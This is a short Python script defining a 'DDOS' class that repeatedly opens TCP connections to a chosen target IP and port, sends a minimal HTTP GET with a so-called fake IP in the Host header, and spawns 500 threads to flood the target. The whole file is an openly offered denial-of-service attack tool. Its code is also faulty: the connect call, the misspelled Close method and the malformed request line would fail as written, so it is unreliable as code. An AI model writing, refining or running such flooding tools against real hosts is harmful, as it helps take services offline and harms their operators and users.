import socket
import threading



class DDOS:

    def __init__(self, target_ip, fake_ip_, port_):
        '''
        param 1 targets ip eg('10.0.0.138')
        param 2 your fake ip eg('182.21.20.32')
        param 3 port eg(80)
        '''
        self.target = target_ip #
        self.fake_ip = fake_ip_
        self.port = port_

    def attack(self):
        while(True):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(self.target,self.port)
            s.sendto(("GET /" + self.target + "HTTP/1.1\r\n").encode('ascii'),(self.target,self.port))
            s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
            s.Close()
    

    def GetSentAttack(self):
        for i in range(500):
            thread = threading.Thread(target=self.attack)
            thread.start()